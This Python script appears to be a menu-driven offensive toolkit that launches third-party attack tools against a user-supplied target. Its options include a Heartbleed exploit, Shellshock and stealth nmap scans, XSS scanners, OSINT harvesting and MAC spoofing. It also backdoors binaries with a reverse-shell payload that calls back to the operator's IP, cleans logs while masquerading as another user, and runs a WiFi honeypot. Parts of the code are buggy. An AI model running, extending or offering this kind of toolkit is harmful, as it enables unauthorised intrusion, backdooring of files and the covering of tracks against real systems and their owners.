#!/bin/python
import sys
import subprocess

sys.path.append('/PATH/TO//XSSYA/')

def menu():
    while True:
        for arg in sys.argv:
            arg = sys.argv
            if arg[1] in ("-s", "--start"):
                startup_spoofer()
                startup_vuln()
                arg[1] = "-m"
            elif arg[1] in ("-m", "--menu"):
                print (55 * '-')
                print (" (           (           (        )      )       (     ")
                print (" )\ )        )\ )   (  ) )\ )  ( /(   ( /(       )\ )  ")
                print (" (()/(   (   (()/(` )  /((()/(  )\())  )\()) (   (()/  ")
                print (" /(_))  )\   /(_))( )(_))/(_))((_)\  ((_)\  )\   /(_)) ")
                print (" (_))_  ((_) (_)) (_(_())(_))    ((_)__ ((_)((_) (_))  ")
                print (" |   \ | __|/ __||_   _|| _ \  / _ \ \ \ / /| __|| _ \ ")
                print (" | |) || _| \__ \  | |  |   / | (_) | \ V / | _| |   / ")
                print (" |___/ |___||___/  |_|  |_|_\  \___/   |_|  |___||_|_\ ")
                print (55 * '-')
                print ("What mischief would you like to do today sir?")
                print ("1. URL XXS and CSRF")
                print ("2. OSINT:")
                print ("3. Macchager")
                print ("4. SSL Heart Bleading")
                print ("5. NMAP ShellShock SCAN")
                print ("6. NMAP: Scan Network")
                print ("7. pyLOGCLEANER: log change")
                print ("8. Wifi honey")
                print ("9. Linux vulnerabilites by kernel version")
                print ("10. The backdoor factory: backdoor an image")
                print ("11. Torify: run an app through tor")

                me = raw_input('Enter choice to begin the fun: ')
                me = int(me)

                if me == 1:
                    xssya()
                if me == 2:
                    OSINT()
                if me == 3:
                    spoofer()
                if me == 4:
                    ssltest()
                if me == 5:
                    shsh()
                if me == 6:
                    nmap()
                if me == 7:
                    logcln()
                if me == 8:
                    honey()
                if me == 9:
                    linux_vul()
                if me == 10:
                    back()
                if me == 11:
                    torify()
                else:
                    return menu()
def torify():
    apps = raw_input('What is the application you want to wrap around tor: ')
    if apps == "nmap":
        subprocess.check_call(["torify", nmap()])
        return menu()
    else:
        subprocess.check_call(["torify", apps])
        return menu()
def shsh():
    target = raw_input('what is the ip/URL of the target?: ')
    subprocess.check_call(["nmap", "-sV", "-p-", "--script", "http-shellshock", target])


def back():
    INf = raw_input('What is the directory containing the file you want to backdoor?: ')

    Pl = raw_input('Do you want to use a predenfined payload? y or n: ')
    if Pl == 'y':
        pl = "-s"
        Pl = raw_input('What is the payloads name?: ')
    ip = raw_input('What your Ip to listen for the reverse shell?: ')
    host = "-H"
    port = raw_input('What is the port number to listen on/connect back to?: ')
    prt = "-P"
    subprocess.check_call(["backdoor-factory", "-d", INf, pl, Pl, host, ip, prt, port])


def linux_vul():
    unamer = raw_input('What your linux kernel version?hint uname -r: ')
    subprocess.check_call(["perl", "Linux_Exploit_Suggester.pl", unamer])
    return 0


def startup_vuln():
    print("showing your vulnerabilities based on linux kernel version: ")
    subprocess.check_call(["perl", "Linux_Exploit_Suggester.pl", "uname -r"])


def honey():
    print ("wifi-honey tastes the best....")
    target = raw_input('what is the essid?: ')
    chan = raw_input('what channel do you want to broadast on?: ')
    inter = raw_input('what is the interface to use: ')
    subprocess.check_call(["wifi-honey", target, chan, inter])


def nmap():
    print ("opening nmap....")

    print ("What type of scan do you want to do?: ")
    scan = raw_input(
        'SCAN TYPES: ACK, FIN, IDEL,  DNS, NULL, PING, SYN, TCP, UDP, XMAS, FTPbounce: ' )
    if scan not in ("ACK", "FIN", "IDEL",  "DNS", "NULL", "PING", "SYN", "TCP", "UDP", "XMAS", "FTPbounce"):
        print("you failed already!")
        return;
    elif scan in ("ACK", "FIN", "IDEL",  "DNS", "NULL", "PING", "SYN", "TCP", "UDP", "XMAS", "FTPbounce"):
        if scan in("ACK"):
            scan = "-sA"
        elif scan in ("FIN"):
            scan = "-sF"
        elif scan in ("IDEL"):
            scan = "-sl"
        elif scan in ("DNS"):
            scan = "-sL"
        elif scan in ("NULL"):
            scan = "-sN"
        elif scan in ("PING"):
            scan = "-sP"
        elif scan in ("SYN"):
            scan = "-sS"
        elif scan in ("TCP"):
            scan = "-sT"
        elif scan in ("UDP"):
            scan = "-sU"
        elif scan in ("XMAS"):
            scan = "-sX"
        elif scan in ("FTPbouce"):
            scan = "-b<ftp relay host>"
        else:
            print ("you did not enter a correct scan type")
    option = raw_input('OPTIONS: -o (OS fingerprinting), -A (version detecion on each 	port), -f(fragment), --randomize-hosts')
    target = raw_input('what is the ip/cidr of the target?: ')
    time = raw_input('do you want to use timing?, I suggest you do you paranoid fucker! ')
    if time in ("yes","y","Y","YES", "Yes"):
        time = raw_input("are you being paranoid, sneaky, polite, parallel, aggressive, or insane: ")
        if time in ("paranoid", "sneaky", "polite", "parallel", "aggressive", "insane"):
            if time in("paranoid"):
                time = "-T0"
            elif time in ("sneaky"):
                time = "-T1"
            elif time in ("polite"):
                time = "-T2"
            elif time in ("parallel"):
                time = "-T3"
            elif time in ("aggressive"):
                time = "-T4"
            elif time in ("insane"):
                time = "-T5"
        else:
            print ("you failed at entering the timing level")
            return;

    elif time not in ("yes","y","Y","YES", "Yes"):
        time = ""

    subprocess.check_call(["nmap", scan, time, option, target])
    return menu()


def xssya():
    choice = raw_input('What tool do you want to use 1.XSSYA 2.Garmr: ')
    choice = int(choice)
    if choice == 1:
	subprocess.check_call(["python", "xssya.py"])

    elif choice == 2:
        target = raw_input('What is the target URL?(must include http): ')
        subprocess.check_call(["garmr-2.7", "-u", target])
        return menu()


def logcln():
    print ("starting pylogcleaner")
    usr = raw_input('what user are you mascarading as?: ')
    hostname = raw_input('what host name?: ')
    subprocess.check_call(["python", "logcleaner.py", "-u", usr, "-h", hostname])
    return menu()


def ssltest():
    target = raw_input('heartAttack: What server to exploit?: ')
    subprocess.check_call(["python", "ssltest.py", target])
    return menu()


def startup_spoofer():
    print ("Spoof mac")
    inter = "wlan0"
    subprocess.check_call(["ifconfig", inter, "down"])
    subprocess.check_call(["macchanger", "-A", inter])
    subprocess.check_call(["ifconfig", inter, "up"])


def spoofer():
    print ("Spoof mac")
    inter = raw_input('What is the interface to spoof?: ')
    option = raw_input('random or change_ending?(1,2): ')
    subprocess.check_call(["ifconfig", inter, "down"])
    option = int(option)
    if option == 1:

        subprocess.check_call(["macchanger", "-A", inter])
        subprocess.check_call(["ifconfig", inter, "up"])
        return menu()
    elif option == 2:
        subprocess.check_call(["macchanger", "-e", inter])
        subprocess.check_call(["ifconfig", inter, "up"])
        return menu()


def OSINT():
    print ("How would you like to gather info?")
    print ("1. whois?")
    print ("2. Dark Magic")
    print ("3. TekDefendor")
    print ("4. the harvester")

    dec = raw_input('enter choice: ')
    dec = int(dec)

    if dec == 1:
        print ("whois: ")
        target = raw_input('Please enter target ip or website: ')
        subprocess.check_call(["whois", target])
        return menu()
    if dec == 2:
        print ("using DeepMagic")
        target = raw_input('what is the url or ip of the target?: ')
        subprocess.check_call(["dmitry", "-sen", target])
        return menu()
    if dec == 3:
        print ("Using TekDefendor")
        target = raw_input('what is the url or Company name of the target?: ')
        subprocess.check_call(["automater", target])
        return menu()
    if dec == 4:
        print ("Using theHarvester")
        target = raw_input('what is the url or Company name of the target?: ')
        subprocess.check_call(["theharvester", "-d", target, "-l", "200", "-b", "all"])
        return menu()


def main():
    try:
        menu()
        return 0
    except:
        return 1


if __name__ == "__main__":
    sys.exit(main())
